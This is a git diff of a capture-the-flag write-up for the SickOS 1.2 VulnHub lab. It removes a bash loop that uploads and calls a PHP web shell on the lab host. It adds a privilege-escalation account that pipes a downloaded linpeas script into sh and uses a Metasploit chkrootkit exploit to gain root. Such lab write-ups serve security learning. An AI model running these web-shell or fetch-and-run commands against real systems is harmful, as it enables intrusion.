@@ -43,17 +43,9 @@ I triggered the file but nothing happened.
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/da50855c-87d1-436e-906f-e674bb44ca9b)
 
 Hence I wrote a simple bash script to gain an interactive shell.(testnc.sh)
- So we can perform a kind a port scan with nc to learn allowed ports.
- #/bin/bash
-while : 
-do
-read -p " ->" command;
 
- echo "<?php echo shell_exec(\"$command\"); ?>" > run.php
-curl http://192.168.146.174/test/ --upload-file run.php -H "Expect: "  
-sleep 1
-curl 192.168.146.174/test/run.php
-done
+ ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/45459a72-cb78-4f84-b14b-b919d38cc6b1)
+
  with the codes above, i aimed to run an interactive shell commands via my terminal over php shortly.
  ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/64bed9ff-5d2c-49ec-9c4a-6567f52d9449)
 
@@ -85,4 +77,22 @@ then we've the session but we need to escalate our privileges.
 
 ![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/86a15ab1-e33b-4353-88ba-9b4666faebf0)
 
+first i run metasploit's exploit suggester but nothing found, then i downloaded linepeas script and run on the target.
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+it gave lots of information about the local vulnerabilities and searched alot on all of them. also i tried dirty cow exploits but didn't work in my case.
+linepeas outputed a chkrootkit vulnerability that is exist in metasploit and i used it. Remember, we had already an active meterpreter session.
+
+![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/dea6ddc2-4bf6-471b-a744-9fed456a856f)
+
+
+![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/c5e81087-ace7-4e75-a438-886b8d0e3e3a)
+
+![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/1db4377c-ef92-4190-b0bb-3607e8be2fce)
+
+finally we're root and let's read the flag and active rule.
+![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/b0fec40f-6a4f-4ca5-88c2-e8b41d94b58b)
+
+![image](https://github.com/harunsvnc/SickOS1.2/assets/75423540/000f74ed-fb53-4457-809c-c725f11afeea)
+
+Thanks to @vulnhub and D4rk for this challenge.
 
